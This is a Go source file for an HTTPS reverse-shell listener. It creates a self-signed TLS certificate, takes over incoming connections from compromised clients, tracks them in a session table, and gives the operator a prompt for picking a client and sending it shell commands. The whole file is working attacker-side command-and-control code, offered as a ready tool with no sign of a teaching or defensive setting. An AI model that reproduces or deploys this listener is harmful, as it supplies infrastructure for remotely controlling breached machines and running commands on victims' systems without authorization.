package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	clientConnections = make(map[string]chan string)
	clientResponses   = make(map[string]chan string)
	mutex             sync.Mutex
)

// generateSelfSignedCert creates a self-signed TLS certificate on the fly
func generateSelfSignedCert() (tls.Certificate, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate private key: %v", err)
	}

	notBefore := time.Now()
	notAfter := notBefore.Add(365 * 24 * time.Hour)

	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			Organization:  []string{"Reverse Shell Listener"},
			CommonName:   "localhost",
		},
		NotBefore:             notBefore,
		NotAfter:              notAfter,
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to create certificate: %v", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to load certificate: %v", err)
	}

	return cert, nil
}

// reverseShellHandler handles incoming client connections
func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
	clientAddr := r.RemoteAddr
	log.Printf("[+] New client connected: %s", clientAddr)

	hijacker, ok := w.(http.Hijacker)
	if !ok {
		http.Error(w, "Hijacking not supported", http.StatusInternalServerError)
		return
	}

	conn, bufrw, err := hijacker.Hijack()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer conn.Close()

	fmt.Fprintf(bufrw, "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n")
	bufrw.Flush()

	cmdChan := make(chan string, 10)
	respChan := make(chan string, 10)

	mutex.Lock()
	clientConnections[clientAddr] = cmdChan
	clientResponses[clientAddr] = respChan
	mutex.Unlock()

	defer func() {
		mutex.Lock()
		delete(clientConnections, clientAddr)
		delete(clientResponses, clientAddr)
		mutex.Unlock()
		close(cmdChan)
		close(respChan)
		log.Printf("[-] Client disconnected: %s", clientAddr)
	}()

	go func() {
		scanner := bufio.NewScanner(bufrw)
		for scanner.Scan() {
			response := scanner.Text()
			respChan <- response
		}
	}()

	fmt.Fprintf(bufrw, "INFO\n")
	bufrw.Flush()

	for {
		select {
		case cmd, ok := <-cmdChan:
			if !ok {
				return
			}
			fmt.Fprintf(bufrw, "%s\n", cmd)
			bufrw.Flush()
			
			if cmd == "exit" {
				return
			}
		case <-time.After(30 * time.Second):
			fmt.Fprintf(bufrw, "PING\n")
			bufrw.Flush()
		}
	}
}

func interactiveShell() {
	reader := bufio.NewReader(os.Stdin)
	
	fmt.Println("\n=== Reverse Shell Listener ===")
	fmt.Println("Commands:")
	fmt.Println("  list                 - List connected clients")
	fmt.Println("  use <client_id>      - Interact with a specific client")
	fmt.Println("  exit                 - Exit the listener")
	fmt.Println()

	var currentClient string

	for {
		if currentClient == "" {
			fmt.Print("listener> ")
		} else {
			fmt.Printf("shell[%s]> ", currentClient)
		}

		input, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Error reading input: %v", err)
			continue
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		command := parts[0]

		if currentClient == "" {
			switch command {
			case "list":
				mutex.Lock()
				if len(clientConnections) == 0 {
					fmt.Println("No clients connected")
				} else {
					fmt.Println("\nConnected Clients:")
					i := 1
					for addr := range clientConnections {
						fmt.Printf("  %d. %s\n", i, addr)
						i++
					}
					fmt.Println()
				}
				mutex.Unlock()

			case "use":
				if len(parts) < 2 {
					fmt.Println("Usage: use <client_address>")
					continue
				}
				clientAddr := strings.Join(parts[1:], " ")
				mutex.Lock()
				if _, exists := clientConnections[clientAddr]; exists {
					currentClient = clientAddr
					fmt.Printf("Now interacting with: %s\n", clientAddr)
					fmt.Println("Type 'background' to return to listener prompt")
				} else {
					fmt.Printf("Client not found: %s\n", clientAddr)
					fmt.Println("Use 'list' to see connected clients")
				}
				mutex.Unlock()

			case "exit", "quit":
				fmt.Println("Shutting down listener...")
				os.Exit(0)

			default:
				fmt.Println("Unknown command. Available: list, use, exit")
			}
		} else {
			if input == "background" || input == "bg" {
				fmt.Printf("Backgrounding session with %s\n", currentClient)
				currentClient = ""
				continue
			}

			mutex.Lock()
			cmdChan, exists := clientConnections[currentClient]
			respChan := clientResponses[currentClient]
			mutex.Unlock()

			if !exists {
				fmt.Println("Client disconnected")
				currentClient = ""
				continue
			}

			cmdChan <- input

			if input == "exit" {
				currentClient = ""
				continue
			}

			select {
			case response := <-respChan:
				fmt.Println(response)
				for {
					select {
					case resp := <-respChan:
						if resp == "<<<END_OF_OUTPUT>>>" {
							goto nextCommand
						}
						fmt.Println(resp)
					case <-time.After(100 * time.Millisecond):
						goto nextCommand
					}
				}
			nextCommand:
			case <-time.After(5 * time.Second):
				fmt.Println("(command sent, no response received)")
			}
		}
	}
}

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "Usage: %s <port> <network-interface>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s 8443 0.0.0.0\n", os.Args[0])
		os.Exit(1)
	}

	port := os.Args[1]
	networkInterface := os.Args[2]
	address := fmt.Sprintf("%s:%s", networkInterface, port)

	log.Println("Generating self-signed certificate...")
	cert, err := generateSelfSignedCert()
	if err != nil {
		log.Fatalf("Failed to generate certificate: %v", err)
	}
	log.Println("Certificate generated successfully")

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", reverseShellHandler)

	server := &http.Server{
		Addr:         address,
		Handler:      mux,
		TLSConfig:    tlsConfig,
		ReadTimeout:  0,
		WriteTimeout: 0,
	}

	log.Printf("Starting HTTPS listener on %s", address)
	
	go func() {
		err := server.ListenAndServeTLS("", "")
		if err != nil {
			log.Fatalf("Server failed: %v", err)
		}
	}()

	time.Sleep(500 * time.Millisecond)
	
	log.Println("Listener ready. Waiting for connections...")

	interactiveShell()
}
